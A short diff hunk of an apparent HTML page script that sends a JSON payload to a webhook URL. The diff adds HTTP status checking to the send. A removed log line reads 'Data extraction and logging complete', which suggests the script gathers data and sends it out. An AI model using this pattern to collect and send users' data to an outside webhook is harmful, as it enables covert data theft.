@@ -239,16 +239,19 @@ Please verify the system logs immediately!
 -----------------------------------------------------
 `;
 
-    await fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(embed)
-    });
+try {
+  const response = await fetch(webhookURL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(embed)
+  });
 
-    console.log("Data extraction and logging complete.");
-  } catch (error) {
-    console.error("ERROR: Failed to send webhook:", error);
+  if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
   }
-})();
-</script>
-</html>
+  console.log("Webhook sent successfully!");
+} catch (error) {
+  console.error("Error sending webhook:", error);
+}
